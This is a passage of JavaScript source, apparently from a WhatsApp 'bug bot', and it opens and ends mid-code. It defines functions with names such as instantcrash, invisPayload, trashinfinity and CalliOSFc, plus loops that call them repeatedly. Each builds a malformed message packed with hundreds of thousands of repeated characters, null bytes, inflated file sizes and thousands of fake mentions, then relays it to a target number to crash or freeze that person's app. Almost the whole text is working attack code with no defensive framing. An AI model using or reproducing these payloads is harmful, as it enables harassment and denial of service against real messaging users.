          await CalliOSFc(sock, target, Ptcp = true);
          await GOOSFc(sock, target, Ptcp = true);
          await instantcrash(sock, target);
          await instantcrash(sock, target);
          await delayforceMessage(sock, target);
          await invisPayload(sock, target);
          }
      }
          
async function bug5(sock, target) {
      for (let i = 0; i < 10; i++) {
          await CrashCursor(sock, target);
          await invisPayload(sock, target);
          await trashinfinity(sock, target);
          await invc2(sock, target);
          await Payload(sock, target);
          await indictiveUI(sock, target);
          await indictiveUI(sock, target);
          await invc2(sock, target);
          await indictiveUI(sock, target);
          await instantcrash(sock, target);
          await CrashCursor(sock, target);
          }
      }

//~~~~~~~~~~~~~~~~~~~FUNTION BUG~~~~~~~~~~~~~~~~~~~~\\

async function instantcrash(sock, target) {
  try {
    let message = {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
          },
          interactiveMessage: {
            contextInfo: {
              mentionedJid: [target],
              isForwarded: true,
              forwardingScore: 999,
              businessMessageForwardInfo: {
                businessOwnerJid: target,
              },
            },
            body: {
              text: "⃟⃟༑͢͢𝒀𝑶𝑼〠𝑨𝑹𝑬⃟༑⌁𝑰𝑫𝑰𝑶𝑻〠⃰͢⃟༑͢⃟༑⌁⃰͢͢╴͒ᝄ ",
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: "",
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
              ],
            },
          },
        },
      },
    };

    await sock.relayMessage(target, message, {
      participant: { jid: target },
    });
  } catch (err) {
    console.log(err);
  }
}

async function delayforceMessage(sock, target) {
    let message = {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
          },
          interactiveMessage: {
              contextInfo: {
              stanzaId: sock.generateMessageTag(),
              participant: "0@s.whatsapp.net",
              quotedMessage: {
                    documentMessage: {
                        url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0&mms3=true",
                        mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                        fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
                        fileLength: "9999999999999",
                        pageCount: 35675873277,
                        mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
                        fileName: " 🦠⃟͒  ⃨⃨⃨𝐈𝐍𝐃𝐈𝐂𝐓𝐈𝐕𝐄⃰͢⃟༑͢⃟༑𝐅𝐎𝐑𝐄𝐕𝐄𝐑 ヶ⃔͒⃰   ",
                        fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
                        directPath: "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0",
                        mediaKeyTimestamp: "1735456100",
                        contactVcard: true,
                        caption: " 🦠⃟͒  ⃨⃨⃨𝐈𝐍𝐃𝐈𝐂𝐓𝐈𝐕𝐄⃰͢⃟༑͢⃟༑𝐅𝐎𝐑𝐄𝐕𝐄𝐑 ヶ⃔͒⃰   "
                    },
                },
              },
            body: {
              text: " 🦠⃟͒  ⃨⃨⃨𝐈𝐍𝐃𝐈𝐂𝐓𝐈𝐕𝐄⃰͢⃟༑͢⃟༑𝐅𝐎𝐑𝐄𝐕𝐄𝐑 ヶ⃔͒⃰   " + "ꦾ".repeat(20000)
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: "\u0000".repeat(90000),
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: "\u0000".repeat(90000),
                },
                {
                  name: "cta_url",
                  buttonParamsJson: "\u0000".repeat(90000),
                },
                {
                  name: "cta_call",
                  buttonParamsJson: "\u0000".repeat(90000),
                },
                {
                  name: "cta_copy",
                  buttonParamsJson: "\u0000".repeat(90000),
                },
                {
                  name: "cta_reminder",
                  buttonParamsJson: "\u0000".repeat(90000),
                },
                {
                  name: "cta_cancel_reminder",
                  buttonParamsJson: "\u0000".repeat(90000),
                },
                {
                  name: "address_message",
                  buttonParamsJson: "\u0000".repeat(90000),
                },
                {
                  name: "send_location",
                  buttonParamsJson: "\u0000".repeat(90000),
                },
                {
                  name: "quick_reply",
                  buttonParamsJson: "\u0000".repeat(90000),
                },
                {
                  name: "mpm",
                  buttonParamsJson: "\u0000".repeat(90000),
                },
              ],
            },
          },
        },
      },
    };
    await sock.relayMessage(target, message, {
      participant: { jid: target },
    });
  }

async function invisPayload(sock, target) {
      let sections = [];
      for (let i = 0; i < 10000; i++) {
        let largeText = "\u0000".repeat(900000);
        let deepNested = {
          title: "\u0000".repeat(900000),
          highlight_label: "\u0000".repeat(900000),
          rows: [
            {
              title: largeText,
              id: "\u0000".repeat(900000),
              subrows: [
                {
                  title: "\u0000".repeat(900000),
                  id: "\u0000".repeat(900000),
                  subsubrows: [
                    {
                      title: "\u0000".repeat(900000),
                      id: "\u0000".repeat(900000),
                    },
                    {
                      title: "\u0000".repeat(900000),
                      id: "\u0000".repeat(900000),
                    },
                  ],
                },
                {
                  title: "\u0000".repeat(900000),
                  id: "\u0000".repeat(900000),
                },
              ],
            },
          ],
        };
        sections.push(deepNested);
      }
      let listMessage = {
        title: "\u0000".repeat(900000),
        sections: sections,
      };
      let message = {
        viewOnceMessage: {
          message: {
            messageContextInfo: {
              deviceListMetadata: {},
              deviceListMetadataVersion: 2,
            },
            interactiveMessage: {
              contextInfo: {
              stanzaId: sock.generateMessageTag(),
              participant: "0@s.whatsapp.net",
              mentionedJid: [target],
									quotedMessage: {
										documentMessage: {
											url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
											mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
											fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
											fileLength: "9999999999999",
											pageCount: 19316134911,
											mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
											fileName: " 🦠⃟͒  ⃨⃨⃨𝐈𝐍𝐃𝐈𝐂𝐓𝐈𝐕𝐄⃰͢⃟༑͢⃟༑𝐅𝐎𝐑𝐄𝐕𝐄𝐑 ヶ⃔͒⃰   ",
											fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
											directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
											mediaKeyTimestamp: "1724474503",
											contactVcard: true,
											thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
											thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
											thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
											jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAOQMBIgACEQEDEQH/xAAvAAACAwEBAAAAAAAAAAAAAAACBAADBQEGAQADAQAAAAAAAAAAAAAAAAABAgMA/9oADAMBAAIQAxAAAAA87YUMO16iaVwl9FSrrywQPTNV2zFomOqCzExzltc8uM/lGV3zxXyDlJvj7RZJsPibRTWvV0qy7dOYo2y5aeKekTXvSVSwpCODJB//xAAmEAACAgICAQIHAQAAAAAAAAABAgADERIEITETUgUQFTJBUWEi/9oACAEBAAE/ACY7EsTF2NAGO49Ni0kmOIflmNSr+Gg4TbjvqaqizDX7ZJAltLqTlTCkKTWehaH1J6gUqMCBQcZmoBMKAjBjcep2xpLfh6H7TPpp98t5AUyu0WDoYgOROzG6MEAw0xENbHZ3lN1O5JfAmyZUqcqYSI1qjow2KFgIIyJq0Whz56hTQfcDKbioCmYbAbYYjaWdiIucZ8SokmwA+D1P9e6WmweWiAmcXjC5G9wh42HClusdxERBqFhFZUjWVKAGI/cysDknzK2wO5xbLWBVOpRVqSScmEfyOoCk/wAlC5rmgiyih7EZ/wACca96wcQc1wIvOs/IEfm71sNDFZxUuDPWf9z/xAAdEQEBAQACAgMAAAAAAAAAAAABABECECExEkFR/9oACAECAQE/AHC4vnfqXelVsstYSdb4z7jvlz4b7lyCfBYfl//EAB4RAAMBAAICAwAAAAAAAAAAAAABEQIQEiFRMWFi/9oACAEDAQE/AMtNfZjPW8rJ4QpB5Q7DxPkqO3pGmUv5MrU4hCv2f//Z",
							},
					   },
              },
              body: {
                text: " 🦠⃟͒  ⃨⃨⃨𝐈𝐍𝐃𝐈𝐂𝐓𝐈𝐕𝐄⃰͢⃟༑͢⃟༑𝐅𝐎𝐑𝐄𝐕𝐄𝐑 ヶ⃔͒⃰   " + "ꦾ".repeat(10000)
              },
              nativeFlowMessage: {
                buttons: [
                  {
                    name: "single_select",
                    buttonParamsJson: "JSON.stringify(listMessage)",
                  },
                  {
                    name: "call_permission_request",
                    buttonParamsJson: "JSON.stringify(listMessage)",
                  },
                  {
                    name: "mpm",
                    buttonParamsJson: "JSON.stringify(listMessage)",
                  },
                {
                  name: "cta_url",
                  buttonParamsJson: "JSON.stringify(listMessage)",
                },
                {
                  name: "cta_call",
                  buttonParamsJson: "JSON.stringify(listMessage)",
                },
                {
                  name: "cta_copy",
                  buttonParamsJson: "JSON.stringify(listMessage)",
                },
                {
                  name: "address_message",
                  buttonParamsJson: "\u0000".repeat(90000),
                },
                {
                  name: "send_location",
                  buttonParamsJson: "\u0000".repeat(90000),
                },
                {
                  name: "quick_reply",
                  buttonParamsJson: "\u0000".repeat(90000),
                },
                {
                  name: "mpm",
                  buttonParamsJson: "\u0000".repeat(90000),
                },
                ],
              },
            },
          },
        },
      };
      await sock.relayMessage(target, message, {
        participant: { jid: target },
    });
}

async function invc2(sock, target) {
     let nomor = target
     let msg = await generateWAMessageFromContent(target, {
                viewOnceMessage: {
                    message: {
                        interactiveMessage: {
                            header: {
                                title: "",
                                hasMediaAttachment: false
                            },
                            body: {
                                text: ""
                            },
                            nativeFlowMessage: {
                                messageParamsJson: "",
                                buttons: [{
                                        name: "single_select",
                                        buttonParamsJson: "z"
                                    },
                                    {
                                        name: "call_permission_request",
                                        buttonParamsJson: "{}"
                                    }
                                ]
                            }
                        }
                    }
                }
            }, {});

            await sock.relayMessage(target, msg.message, {
                messageId: msg.key.id,
                participant: { jid: target }
            });
        }

async function Payload(sock, target) {
      let sections = [];

      for (let i = 0; i < 1; i++) {
        let largeText = "ꦾ".repeat(1);

        let deepNested = {
          title: `Super Deep Nested Section ${i}`,
          highlight_label: `Extreme Highlight ${i}`,
          rows: [
            {
              title: largeText,
              id: `id${i}`,
              subrows: [
                {
                  title: "Nested row 1",
                  id: `nested_id1_${i}`,
                  subsubrows: [
                    {
                      title: "Deep Nested row 1",
                      id: `deep_nested_id1_${i}`,
                    },
                    {
                      title: "Deep Nested row 2",
                      id: `deep_nested_id2_${i}`,
                    },
                  ],
                },
                {
                  title: "Nested row 2",
                  id: `nested_id2_${i}`,
                },
              ],
            },
          ],
        };

        sections.push(deepNested);
      }

      let listMessage = {
        title: "Massive Menu Overflow",
        sections: sections,
      };

      let message = {
        viewOnceMessage: {
          message: {
            messageContextInfo: {
              deviceListMetadata: {},
              deviceListMetadataVersion: 2,
            },
            interactiveMessage: {
              contextInfo: {
                mentionedJid: [target],
                isForwarded: true,
                forwardingScore: 999,
                businessMessageForwardInfo: {
                  businessOwnerJid: target,
                },
              },
              body: {
                text: " 𝐈𝐍ͯ͢𝐃𝐈Σ𝐓𝐈𝐕𝚵⃰͢⃟༑͢⃟༑𝐅𝐋𝚯𝚯𝐃𝐁͢𝐔𝐑𝐒𝐇 ラ‣  ",
              },
              nativeFlowMessage: {
                buttons: [
                  {
                    name: "single_select",
                    buttonParamsJson: "JSON.stringify(listMessage)",
                  },
                  {
                    name: "call_permission_request",
                    buttonParamsJson: "JSON.stringify(listMessage)",
                  },
                  {
                    name: "mpm",
                    buttonParamsJson: "JSON.stringify(listMessage)",
                  },
                ],
              },
            },
          },
        },
      };

      await sock.relayMessage(target, message, {
        participant: { jid: target },
      });
    }

async function trashdevice(sock, target) {
    const messagePayload = {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        documentMessage: {
                                url: "https://mmg.whatsapp.net/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0&mms3=true",
                                mimetype: "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
                                fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                                fileLength: "999999999999",
                                pageCount: 0x9ff9ff9ff1ff8ff4ff5f,
                                mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                                fileName: `𝐈𝐍ͯ͢𝐃𝐈Σ𝐓𝐈𝐕𝚵⃰͢⃟༑͢⃟༑𝐅𝐋𝚯𝚯𝐃𝐁͢𝐔𝐑𝐒𝐇 ラ‣ 𐎟`,
                                fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                                directPath: "/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0",
                                mediaKeyTimestamp: "1715880173"
                            },
                        hasMediaAttachment: true
                    },
                    body: {
                            text: "𝐈𝐍ͯ͢𝐃𝐈Σ𝐓𝐈𝐕𝚵⃰͢⃟༑͢⃟༑𝐅𝐋𝚯𝚯𝐃𝐁͢𝐔𝐑𝐒𝐇 ラ‣ 𐎟" + "ꦾ".repeat(150000) + "@1".repeat(250000)
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                            mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                            groupMentions: [{ groupJid: "1@newsletter", groupSubject: "ALWAYSAQIOO" }],
                        isForwarded: true,
                        quotedMessage: {
								documentMessage: {
											url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
											mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
											fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
											fileLength: "999999999999",
											pageCount: 0x9ff9ff9ff1ff8ff4ff5f,
											mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
											fileName: "Alwaysaqioo The Juftt️",
											fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
											directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
											mediaKeyTimestamp: "1724474503",
											contactVcard: true,
											thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
											thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
											thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
											jpegThumbnail: "",
						}
                    }
                    }
                }
            }
        }
    };

    sock.relayMessage(target, messagePayload, { participant: { jid: target } }, { messageId: null });
}

async function trashinfinity(sock, target) {
 let virtex = "𝐈𝐍ͯ͢𝐃𝐈Σ𝐓𝐈𝐕𝚵⃰͢⃟༑͢⃟༑𝐅𝐋𝚯𝚯𝐃𝐁͢𝐔𝐑𝐒𝐇 ラ‣ 𐎟";
   sock.relayMessage(target, {
     groupMentionedMessage: {
       message: {
        interactiveMessage: {
          header: {
            documentMessage: {
              url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
                                    mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                                    fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                                    fileLength: "99999999999",
                                    pageCount: 0x9184e729fff,
                                    mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                                    fileName: virtex,
                                    fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                                    directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
                                    mediaKeyTimestamp: "1715880173",
                                    contactVcard: true
                                },
                                hasMediaAttachment: true
                            },
                            body: {
                                text: "𝐈𝐍𝐃𝐈Σ𝐓𝐈𝐕𝚵 𝐅𝐋𝚯𝚯𝐃𝐁𝐔𝐑𝐒𝐇" + "ꦾ".repeat(100000) + "@1".repeat(300000)
                            },
                            nativeFlowMessage: {},
                            contextInfo: {
                                mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                                groupMentions: [{ groupJid: "1@newsletter", groupSubject: "𝙏𝙝𝙖𝙣" }]
                            }
                        }
                    }
                }
            }, { participant: { jid: target } });
        };
        
async function indictiveUI(sock, target) {
  try {
    await sock.relayMessage(
      target,
      {
        ephemeralMessage: {
          message: {
            interactiveMessage: {
              header: {
                locationMessage: {
                  degreesLatitude: 0,
                  degreesLongitude: 0,
                },
                hasMediaAttachment: true,
              },
              body: {
                text:
                  "𝐈𝐍ͯ͢𝐃𝐈Σ𝐓𝐈𝐕𝚵⃰͢⃟༑͢⃟༑𝐅𝐋𝚯𝚯𝐃𝐁͢𝐔𝐑𝐒𝐇 ラ‣ 𐎟\n" +
                  "ꦾ".repeat(92000) +
                  "ꦽ".repeat(92000) +
                  `@1`.repeat(92000),
              },
              nativeFlowMessage: {},
              contextInfo: {
                mentionedJid: [
                  "1@newsletter",
                  "1@newsletter",
                  "1@newsletter",
                  "1@newsletter",
                  "1@newsletter",
                ],
                groupMentions: [
                  {
                    groupJid: "1@newsletter",
                    groupSubject: "Vamp",
                  },
                ],
                quotedMessage: {
                  documentMessage: {
                    contactVcard: true,
                  },
                },
              },
            },
          },
        },
      },
      {
        participant: { jid: target },
        userJid: target,
      }
    );
  } catch (err) {
    console.log(err);
  }
}

async function CalliOSFc(target, Ptcp = true) {
sock.relayMessage(target, {
        extendedTextMessage: {
            text: `𑲭𑲭𝐈𝐍ͯ͢𝐃𝐈Σ𝐓𝐈𝐕𝚵⃰͢⃟༑͢⃟༑𝐅𝐋𝚯𝚯𝐃𝐁͢𝐔𝐑𝐒𝐇 ラ‣ 𐎟𑆻 ${'ꦾ'.repeat(103000)}`,
            contextInfo: {
                mentionedJid: [
                    "13135550002@s.whatsapp.net",
                    ...Array.from({ length: 15000 }, () => `13135550002${Math.floor(Math.random() * 500000)}@s.whatsapp.net`)
                ],
                stanzaId: "1234567890ABCDEF",
                participant: "13135550002@s.whatsapp.net",
                quotedMessage: {
                    callLogMesssage: {
                        isVideo: true,
                        callOutcome: "1",
                        durationSecs: "0",
                        callType: "REGULAR",
                        participants: [
                            {
                                jid: "13135550002@s.whatsapp.net",
                                callOutcome: "1"
                            }
                        ]
                    }
                },
                remoteJid: "13135550002@s.whastapp.net",
                conversionSource: "source_example",
                conversionData: "Y29udmVyc2lvbl9kYXRhX2V4YW1wbGU=",
                conversionDelaySeconds: 10,
                forwardingScore: 99999999,
                isForwarded: true,
                quotedAd: {
                    advertiserName: "Example Advertiser",
                    mediaType: "IMAGE",
                    jpegThumbnail: "https://files.catbox.moe/uergud.jpg",
                    caption: "This is an ad caption"
                },
                placeholderKey: {
                    remoteJid: "13135550002@s.whatsapp.net",
                    fromMe: false,
                    id: "ABCDEF1234567890"
                },
                expiration: 86400,
                ephemeralSettingTimestamp: "1728090592378",
                ephemeralSharedSecret: "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
                externalAdReply: {
                    title: "LOS - AiiXAsep IOS",
                    body: `Ai To Crash ${'\0'.repeat(200)}`,
                    mediaType: "VIDEO",
                    renderLargerThumbnail: true,
                    previewType: "VIDEO",
                    thumbnail: "https://files.catbox.moe/uergud.jpg",
                    sourceType: "x",
                    sourceId: "x",
                    sourceUrl: "https://www.instagram.com/WhastApp",
                    mediaUrl: "https://www.instagram.com/WhastApp",
                    containsAutoReply: true,
                    showAdAttribution: true,
                    ctwaClid: "ctwa_clid_example",
                    ref: "ref_example"
                },
                entryPointConversionSource: "entry_point_source_example",
                entryPointConversionApp: "entry_point_app_example",
                entryPointConversionDelaySeconds: 5,
                disappearingMode: {},
                actionLink: {
                    url: "https://www.instagram.com/WhatsApp"
                },
                groupSubject: "Example Group Subject",
                parentGroupJid: "13135550002@g.us",
                trustBannerType: "trust_banner_example",
                trustBannerAction: 1,
                isSampled: false,
                utm: {
                    utmSource: "utm_source_example",
                    utmCampaign: "utm_campaign_example"
                },
                forwardedNewsletterMessageInfo: {
                    newsletterJid: "13135550002@newsletter",
                    serverMessageId: 1,
                    newsletterName: "Meta Ai",
                    contentType: "UPDATE",
                    accessibilityText: "Meta Ai"
                },
                businessMessageForwardInfo: {
                    businessOwnerJid: "13135550002@s.whatsapp.net"
                },
                smbriyuCampaignId: "smb_riyu_campaign_id_example",
                smbServerCampaignId: "smb_server_campaign_id_example",
                dataSharingContext: {
                    showMmDisclosure: true
                }
            }
        }
    },
    Ptcp
        ? {
              participant: {
                  jid: target
              }
          }
        : {}
       
);
}

async function GOOSFc(target, Ptcp = true) {
sock.relayMessage(target, {
        extendedTextMessage: {
            text: `𑲭𑲭 "⃢𝗚⃢⃢𝗢⃢𝗞⃢𝗨⃢⃢⃢⃢䶃😈⃢⃢⃢㹣䶃𝐁͢𝐔𝐑𝐒𝐇 ラ‣ 𐎟𑆻 ${'ꦾ'.repeat(203000)}`,
            contextInfo: {
                mentionedJid: [
                    "13135550002@s.whatsapp.net",
                    ...Array.from({ length: 15000 }, () => `13135550002${Math.floor(Math.random() * 500000)}@s.whatsapp.net`)
                ],
                stanzaId: "1234567890ABCDEF",
                participant: "13135550002@s.whatsapp.net",
                quotedMessage: {
                    callLogMesssage: {
                        isVideo: true,
                        callOutcome: "1",
                        durationSecs: "0",
                        callType: "REGULAR",
                        participants: [
                            {
                                jid: "13135550002@s.whatsapp.net",
                                callOutcome: "1"
                            }
                        ]
                    }
                },
                remoteJid: "13135550002@s.whastapp.net",
                conversionSource: "source_example",
                conversionData: "Y29udmVyc2lvbl9kYXRhX2V4YW1wbGU=",
                conversionDelaySeconds: 10,
                forwardingScore: 99999999,
                isForwarded: true,
                quotedAd: {
                    advertiserName: "Example Advertiser",
                    mediaType: "IMAGE",
                    jpegThumbnail: "https://files.catbox.moe/uergud.jpg",
                    caption: "This is an ad caption"
                },
                placeholderKey: {
                    remoteJid: "13135550002@s.whatsapp.net",
                    fromMe: false,
                    id: "ABCDEF1234567890"
                },
                expiration: 86400,
                ephemeralSettingTimestamp: "1728090592378",
                ephemeralSharedSecret: "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
                externalAdReply: {
                    title: "LOS - AiiXAsep IOS",
                    body: `Ai To Crash ${'\0'.repeat(200)}`,
                    mediaType: "VIDEO",
                    renderLargerThumbnail: true,
                    previewType: "VIDEO",
                    thumbnail: "https://files.catbox.moe/uergud.jpg",
                    sourceType: "x",
                    sourceId: "x",
                    sourceUrl: "https://www.instagram.com/WhastApp",
                    mediaUrl: "https://www.instagram.com/WhastApp",
                    containsAutoReply: true,
                    showAdAttribution: true,
                    ctwaClid: "ctwa_clid_example",
                    ref: "ref_example"
                },
                entryPointConversionSource: "entry_point_source_example",
                entryPointConversionApp: "entry_point_app_example",
                entryPointConversionDelaySeconds: 5,
                disappearingMode: {},
                actionLink: {
                    url: "https://www.instagram.com/WhatsApp"
                },
                groupSubject: "Example Group Subject",
                parentGroupJid: "13135550002@g.us",
                trustBannerType: "trust_banner_example",
                trustBannerAction: 1,
                isSampled: false,
                utm: {
                    utmSource: "utm_source_example",
                    utmCampaign: "utm_campaign_example"
                },
                forwardedNewsletterMessageInfo: {
                    newsletterJid: "13135550002@newsletter",
                    serverMessageId: 1,
                    newsletterName: "Meta Ai",
                    contentType: "UPDATE",
                    accessibilityText: "Meta Ai"
                },
                businessMessageForwardInfo: {
                    businessOwnerJid: "13135550002@s.whatsapp.net"
                },
                smbriyuCampaignId: "smb_riyu_campaign_id_example",
                smbServerCampaignId: "smb_server_campaign_id_example",
                dataSharingContext: {
                    showMmDisclosure: true
                }
            }
        }
    },
    Ptcp
        ? {
              participant: {
                  jid: target
              }
          }
        : {}
       
);
}
//~~~~~~~~~~~~~~~~~~~~BUG IOS~~~~~~~~~~~~~~~~~~\\

async function QPayIos(sock, target) {
      await sock.relayMessage(
        target,
        {
          paymentInviteMessage: {
            serviceType: "PAYPAL",
            expiryTimestamp: Date.now() + 5184000000,
          },
        },
        {
          participant: {
            jid: target,
          },
        }
      );
    }

    async function QPayStriep(sock, target) {
      await sock.relayMessage(
        target,
        {
          paymentInviteMessage: {
            serviceType: "STRIPE",
            expiryTimestamp: Date.now() + 5184000000,
          },
        },
        {
          participant: {
            jid: target,
          },
        }
      );
    }

    async function QDIphone(sock, target) {
      sock.relayMessage(
        target,
        {
          extendedTextMessage: {
            text: "ꦾ".repeat(55000),
            contextInfo: {
              stanzaId: target,
              participant: target,
              quotedMessage: {
                conversation: "Maaf Kak" + "ꦾ࣯࣯".repeat(50000),
              },
              disappearingMode: {
                initiator: "CHANGED_IN_CHAT",
                trigger: "CHAT_SETTING",
              },
            },
            inviteLinkGroupTypeV2: "DEFAULT",
          },
        },
        {
          paymentInviteMessage: {
            serviceType: "UPI",
            expiryTimestamp: Date.now() + 5184000000,
          },
        },
        {
          participant: {
            jid: target,
          },
        },
        {
          messageId: null,
        }
      );
    }

async function indictive_notif(sock, target) {
			await sock.relayMessage(target, {
					ephemeralMessage: {
						message: {
							interactiveMessage: {
								header: {
									documentMessage: {
										url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
										mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
										fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
										fileLength: "9999999999999",
										pageCount: 1316134911,
										mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
										fileName: "\u0000",
										fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
										directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
										mediaKeyTimestamp: "1726867151",
										contactVcard: true,
										jpegThumbnail: 'https://i.top4top.io/p_32261nror0.jpg',
									},
									hasMediaAttachment: true,
								},
								body: { 
					         text: "ꦾ".repeat(250000) + "@0".repeat(100000)
								},
								nativeFlowMessage: {
									messageParamsJson: "{}",
								},
								contextInfo: {
									mentionedJid: ["0@s.whatsapp.net", ...Array.from({
										length: 10000
									}, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")],
									forwardingScore: 1,
									isForwarded: true,
									fromMe: false,
									participant: "0@s.whatsapp.net",
									remoteJid: "status@broadcast",
									quotedMessage: {
										documentMessage: {
